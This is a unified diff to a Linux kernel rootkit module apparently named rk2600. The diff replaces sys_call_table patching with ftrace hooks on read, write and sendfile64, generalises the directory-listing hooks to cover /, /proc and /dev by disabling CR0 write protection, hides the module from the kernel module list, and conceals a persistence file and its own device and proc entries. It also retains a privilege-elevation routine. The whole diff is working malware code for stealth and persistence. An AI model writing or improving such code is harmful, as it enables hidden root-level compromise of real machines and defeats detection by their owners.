@@ -7,13 +7,13 @@
 #include <linux/list.h>
 #include <linux/spinlock.h>
 #include <linux/proc_fs.h>
-#include <linux/kobject.h>
 #include <linux/kprobes.h>
+#include <linux/ftrace.h>
 #include <linux/dcache.h>
 #include <linux/path.h>
 #include <linux/file.h>
+#include <linux/namei.h>
 #include <asm/processor-flags.h>
-#include <asm/unistd.h>
 
 #include "rk2600_protocol.h"
 
@@ -117,21 +117,85 @@ static inline void wp_restore(unsigned long cr0)
 	preempt_enable();
 }
 
-/* ----------------------------------------------------------- dir hook context */
+/* -------------------------------------------------------- directory hook infra */
+
+struct dir_hook {
+	const char              *path;
+	struct file_operations  *fops;
+	int (*orig_iterate)(struct file *, struct dir_context *);
+	int (*hooked_iterate)(struct file *, struct dir_context *);
+};
 
 struct rk_dir_ctx {
-	struct dir_context ctx;
+	struct dir_context  ctx;
 	struct dir_context *real;
 };
 
-/* ------------------------------------------------------------- root FS hook */
+static int install_dir_hook(struct dir_hook *h)
+{
+	struct file *f;
+	unsigned long cr0;
 
-static int (*orig_root_iterate)(struct file *, struct dir_context *);
-static struct file_operations *root_fops;
+	f = filp_open(h->path, O_RDONLY | O_DIRECTORY, 0);
+	if (IS_ERR(f))
+		return PTR_ERR(f);
 
-static bool root_filldir(struct dir_context *ctx, const char *name,
-			 int namlen, loff_t offset, u64 ino,
-			 unsigned int d_type)
+	h->fops = (struct file_operations *)f->f_op;
+	h->orig_iterate = h->fops->iterate_shared;
+
+	cr0 = wp_disable();
+	h->fops->iterate_shared = h->hooked_iterate;
+	wp_restore(cr0);
+
+	filp_close(f, NULL);
+	return 0;
+}
+
+static void remove_dir_hook(struct dir_hook *h)
+{
+	unsigned long cr0;
+
+	if (!h->fops || !h->orig_iterate)
+		return;
+	cr0 = wp_disable();
+	h->fops->iterate_shared = h->orig_iterate;
+	wp_restore(cr0);
+}
+
+#define DEFINE_DIR_ITERATE(fn_name, filldir_fn, hook_ref)		\
+static int fn_name(struct file *file, struct dir_context *ctx)		\
+{									\
+	struct rk_dir_ctx rk = {					\
+		.ctx.actor = filldir_fn,				\
+		.ctx.pos   = ctx->pos,					\
+		.real      = ctx,					\
+	};								\
+	int ret;							\
+									\
+	ret = (hook_ref).orig_iterate(file, &rk.ctx);			\
+	ctx->pos = rk.ctx.pos;						\
+	return ret;							\
+}
+
+static int rk_root_iterate(struct file *, struct dir_context *);
+static int rk_proc_iterate(struct file *, struct dir_context *);
+static int rk_dev_iterate(struct file *, struct dir_context *);
+
+static struct dir_hook root_hook = {
+	.path = "/", .hooked_iterate = rk_root_iterate
+};
+static struct dir_hook proc_hook = {
+	.path = "/proc", .hooked_iterate = rk_proc_iterate
+};
+static struct dir_hook dev_hook = {
+	.path = "/dev", .hooked_iterate = rk_dev_iterate
+};
+
+/* --------------------------------------------------------- filldir callback */
+
+static bool rk_filldir(struct dir_context *ctx, const char *name,
+		       int namlen, loff_t offset, u64 ino,
+		       unsigned int d_type)
 {
 	struct rk_dir_ctx *rk = container_of(ctx, struct rk_dir_ctx, ctx);
 
@@ -141,113 +205,9 @@ static bool root_filldir(struct dir_context *ctx, const char *name,
 	return rk->real->actor(rk->real, name, namlen, offset, ino, d_type);
 }
 
-static int rk_root_iterate(struct file *file, struct dir_context *ctx)
-{
-	struct rk_dir_ctx rk = {
-		.ctx.actor = root_filldir,
-		.ctx.pos   = ctx->pos,
-		.real      = ctx,
-	};
-	int ret;
-
-	ret = orig_root_iterate(file, &rk.ctx);
-	ctx->pos = rk.ctx.pos;
-	return ret;
-}
-
-static int install_root_hook(void)
-{
-	struct file *f;
-	unsigned long cr0;
-
-	f = filp_open("/", O_RDONLY | O_DIRECTORY, 0);
-	if (IS_ERR(f))
-		return PTR_ERR(f);
-
-	root_fops = (struct file_operations *)f->f_op;
-	orig_root_iterate = root_fops->iterate_shared;
-
-	cr0 = wp_disable();
-	root_fops->iterate_shared = rk_root_iterate;
-	wp_restore(cr0);
-
-	filp_close(f, NULL);
-	return 0;
-}
-
-static void remove_root_hook(void)
-{
-	unsigned long cr0;
-
-	if (!root_fops || !orig_root_iterate)
-		return;
-	cr0 = wp_disable();
-	root_fops->iterate_shared = orig_root_iterate;
-	wp_restore(cr0);
-}
-
-/* -------------------------------------------------------------- proc FS hook */
-
-static int (*orig_proc_iterate)(struct file *, struct dir_context *);
-static struct file_operations *proc_fops_ptr;
-
-static bool proc_filldir(struct dir_context *ctx, const char *name,
-			 int namlen, loff_t offset, u64 ino,
-			 unsigned int d_type)
-{
-	struct rk_dir_ctx *rk = container_of(ctx, struct rk_dir_ctx, ctx);
-
-	if (namlen == (int)(sizeof(RK2600_PROC_NAME) - 1) &&
-	    memcmp(name, RK2600_PROC_NAME, namlen) == 0)
-		return true;
-
-	return rk->real->actor(rk->real, name, namlen, offset, ino, d_type);
-}
-
-static int rk_proc_iterate(struct file *file, struct dir_context *ctx)
-{
-	struct rk_dir_ctx rk = {
-		.ctx.actor = proc_filldir,
-		.ctx.pos   = ctx->pos,
-		.real      = ctx,
-	};
-	int ret;
-
-	ret = orig_proc_iterate(file, &rk.ctx);
-	ctx->pos = rk.ctx.pos;
-	return ret;
-}
-
-static int install_proc_hook(void)
-{
-	struct file *f;
-	unsigned long cr0;
-
-	f = filp_open("/proc", O_RDONLY | O_DIRECTORY, 0);
-	if (IS_ERR(f))
-		return PTR_ERR(f);
-
-	proc_fops_ptr = (struct file_operations *)f->f_op;
-	orig_proc_iterate = proc_fops_ptr->iterate_shared;
-
-	cr0 = wp_disable();
-	proc_fops_ptr->iterate_shared = rk_proc_iterate;
-	wp_restore(cr0);
-
-	filp_close(f, NULL);
-	return 0;
-}
-
-static void remove_proc_hook(void)
-{
-	unsigned long cr0;
-
-	if (!proc_fops_ptr || !orig_proc_iterate)
-		return;
-	cr0 = wp_disable();
-	proc_fops_ptr->iterate_shared = orig_proc_iterate;
-	wp_restore(cr0);
-}
+DEFINE_DIR_ITERATE(rk_root_iterate, rk_filldir, root_hook)
+DEFINE_DIR_ITERATE(rk_proc_iterate, rk_filldir, proc_hook)
+DEFINE_DIR_ITERATE(rk_dev_iterate,  rk_filldir, dev_hook)
 
 /* ----------------------------------------------------------- module hiding */
 
@@ -260,7 +220,6 @@ static void do_hide_module(void)
 		return;
 	saved_prev = THIS_MODULE->list.prev;
 	list_del_init(&THIS_MODULE->list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
 	mod_hidden = true;
 }
 
@@ -284,36 +243,50 @@ static int do_elevate(void)
 	return commit_creds(new);
 }
 
-/* ---------------------------------------------------------- read syscall hook */
+/* ------------------------------------------------------------ syscall hooks */
 
 typedef unsigned long (*kallsyms_lookup_name_fn)(const char *name);
-typedef asmlinkage long (*orig_read_fn)(const struct pt_regs *);
+typedef asmlinkage long (*sys_call_fn)(const struct pt_regs *);
 
-static unsigned long        *rk_sys_call_table;
-static orig_read_fn          orig_sys_read;
+static sys_call_fn orig_sys_read;
+static sys_call_fn orig_sys_write;
+static sys_call_fn orig_sys_sendfile64;
+
+static dev_t persist_dev;
+static unsigned long persist_ino;
+static bool persist_resolved;
+
+static void resolve_persist_file(void)
+{
+	struct path p;
+
+	if (kern_path(RK2600_PERSIST_PATH, LOOKUP_FOLLOW, &p) == 0) {
+		persist_ino = d_inode(p.dentry)->i_ino;
+		persist_dev = d_inode(p.dentry)->i_sb->s_dev;
+		path_put(&p);
+	}
+}
 
 static bool fd_is_persist(int fd)
 {
 	struct file *f;
-	char *buf;
-	char *path;
-	bool match = false;
+	bool match;
+
+	if (!persist_ino) {
+		if (persist_resolved)
+			return false;
+		resolve_persist_file();
+		persist_resolved = true;
+		if (!persist_ino)
+			return false;
+	}
 
 	f = fget(fd);
 	if (!f)
 		return false;
 
-	buf = kmalloc(PATH_MAX, GFP_KERNEL);
-	if (!buf) {
-		fput(f);
-		return false;
-	}
-
-	path = d_path(&f->f_path, buf, PATH_MAX);
-	if (!IS_ERR(path))
-		match = (strcmp(path, RK2600_PERSIST_PATH) == 0);
-
-	kfree(buf);
+	match = f->f_inode->i_ino == persist_ino &&
+		f->f_inode->i_sb->s_dev == persist_dev;
 	fput(f);
 	return match;
 }
@@ -362,9 +335,83 @@ out_free:
 	kfree(kbuf);
 }
 
-asmlinkage long rk_sys_read(const struct pt_regs *regs)
+static asmlinkage long rk_sys_read(const struct pt_regs *);
+static asmlinkage long rk_sys_write(const struct pt_regs *);
+static asmlinkage long rk_sys_sendfile64(const struct pt_regs *);
+
+struct ftrace_hook {
+	const char        *name;
+	void              *hook_fn;
+	sys_call_fn       *orig_fn;
+	unsigned long      address;
+	struct ftrace_ops  ops;
+};
+
+static void notrace fh_callback(unsigned long ip, unsigned long parent_ip,
+				struct ftrace_ops *ops,
+				struct ftrace_regs *fregs)
+{
+	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
+	struct pt_regs *regs = ftrace_get_regs(fregs);
+
+	if (!regs)
+		return;
+	if (within_module(parent_ip, THIS_MODULE))
+		return;
+
+	regs->ip = (unsigned long)hook->hook_fn;
+}
+
+static int install_one_hook(struct ftrace_hook *hook,
+			    kallsyms_lookup_name_fn klnfn)
+{
+	int ret;
+
+	hook->address = klnfn(hook->name);
+	if (!hook->address)
+		return -ENOENT;
+
+	*hook->orig_fn = (sys_call_fn)hook->address;
+
+	hook->ops.func = fh_callback;
+	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+			| FTRACE_OPS_FL_IPMODIFY;
+
+	ret = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+	if (ret)
+		return ret;
+
+	ret = register_ftrace_function(&hook->ops);
+	if (ret) {
+		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+		return ret;
+	}
+
+	return 0;
+}
+
+static void remove_one_hook(struct ftrace_hook *hook)
+{
+	if (!hook->address)
+		return;
+	unregister_ftrace_function(&hook->ops);
+	ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+}
+
+static struct ftrace_hook hooks[] = {
+	{ .name = "__x64_sys_read",  .hook_fn = rk_sys_read,
+	  .orig_fn = &orig_sys_read },
+	{ .name = "__x64_sys_write", .hook_fn = rk_sys_write,
+	  .orig_fn = &orig_sys_write },
+	{ .name = "__x64_sys_sendfile64", .hook_fn = rk_sys_sendfile64,
+	  .orig_fn = &orig_sys_sendfile64 },
+};
+
+static asmlinkage long rk_sys_read(const struct pt_regs *regs)
 {
 	long ret = orig_sys_read(regs);
+
+	asm volatile("" : "+r"(ret));
 
 	if (ret > 0 && fd_is_persist((int)regs->di))
 		filter_persist_buf((char __user *)regs->si, &ret);
@@ -372,12 +419,37 @@ asmlinkage long rk_sys_read(const struct pt_regs *regs)
 	return ret;
 }
 
-static int install_read_hook(void)
+static asmlinkage long rk_sys_write(const struct pt_regs *regs)
+{
+	long ret;
+
+	if (fd_is_persist((int)regs->di))
+		return (long)regs->dx;
+
+	ret = orig_sys_write(regs);
+	asm volatile("" : "+r"(ret));
+	return ret;
+}
+
+static asmlinkage long rk_sys_sendfile64(const struct pt_regs *regs)
+{
+	long ret;
+	int in_fd = (int)regs->si;
+
+	if (fd_is_persist(in_fd))
+		return -EINVAL;
+
+	ret = orig_sys_sendfile64(regs);
+	asm volatile("" : "+r"(ret));
+	return ret;
+}
+
+static int install_syscall_hooks(void)
 {
 	struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
 	kallsyms_lookup_name_fn klnfn;
-	unsigned long cr0;
 	int ret;
+	int i;
 
 	ret = register_kprobe(&kp);
 	if (ret)
@@ -385,29 +457,26 @@ static int install_read_hook(void)
 	klnfn = (kallsyms_lookup_name_fn)kp.addr;
 	unregister_kprobe(&kp);
 
-	rk_sys_call_table = (unsigned long *)klnfn("sys_call_table");
-	if (!rk_sys_call_table)
-		return -ENOENT;
-
-	orig_sys_read = (orig_read_fn)rk_sys_call_table[__NR_read];
-
-	cr0 = wp_disable();
-	rk_sys_call_table[__NR_read] = (unsigned long)rk_sys_read;
-	wp_restore(cr0);
+	for (i = 0; i < ARRAY_SIZE(hooks); i++) {
+		ret = install_one_hook(&hooks[i], klnfn);
+		if (ret)
+			goto err;
+	}
 
 	return 0;
+
+err:
+	while (i-- > 0)
+		remove_one_hook(&hooks[i]);
+	return ret;
 }
 
-static void remove_read_hook(void)
+static void remove_syscall_hooks(void)
 {
-	unsigned long cr0;
+	int i;
 
-	if (!rk_sys_call_table || !orig_sys_read)
-		return;
-
-	cr0 = wp_disable();
-	rk_sys_call_table[__NR_read] = (unsigned long)orig_sys_read;
-	wp_restore(cr0);
+	for (i = ARRAY_SIZE(hooks) - 1; i >= 0; i--)
+		remove_one_hook(&hooks[i]);
 }
 
 /* ------------------------------------------------------------- ioctl handler */
@@ -532,7 +601,7 @@ static int __init rk_init(void)
 	if (ret)
 		return ret;
 
-	ret = install_root_hook();
+	ret = install_dir_hook(&root_hook);
 	if (ret)
 		goto err_dev;
 
@@ -542,29 +611,38 @@ static int __init rk_init(void)
 		goto err_root;
 	}
 
-	ret = install_proc_hook();
+	ret = install_dir_hook(&proc_hook);
 	if (ret)
 		goto err_proc;
 
-	ret = install_read_hook();
+	ret = install_dir_hook(&dev_hook);
 	if (ret)
 		goto err_proc_hook;
 
-	/* Auto-hide persistence artefacts on the root filesystem */
+	ret = install_syscall_hooks();
+	if (ret)
+		goto err_dev_hook;
+
+	resolve_persist_file();
+
 	hide_name(RK2600_PERSIST_NAME);
 	hide_name(RK2600_MODULE_FILE);
 	hide_name(RK2600_MODULE_NAME);
+	hide_name(RK2600_PROC_NAME);
+	hide_name(RK2600_DEVICE_NAME);
 
 	do_hide_module();
 
 	return 0;
 
+err_dev_hook:
+	remove_dir_hook(&dev_hook);
 err_proc_hook:
-	remove_proc_hook();
+	remove_dir_hook(&proc_hook);
 err_proc:
 	proc_remove(proc_entry);
 err_root:
-	remove_root_hook();
+	remove_dir_hook(&root_hook);
 err_dev:
 	misc_deregister(&rk_dev);
 	return ret;
@@ -572,10 +650,11 @@ err_dev:
 
 static void __exit rk_exit(void)
 {
-	remove_read_hook();
-	remove_proc_hook();
+	remove_syscall_hooks();
+	remove_dir_hook(&dev_hook);
+	remove_dir_hook(&proc_hook);
 	proc_remove(proc_entry);
-	remove_root_hook();
+	remove_dir_hook(&root_hook);
 	flush_hidden();
 	misc_deregister(&rk_dev);
 }
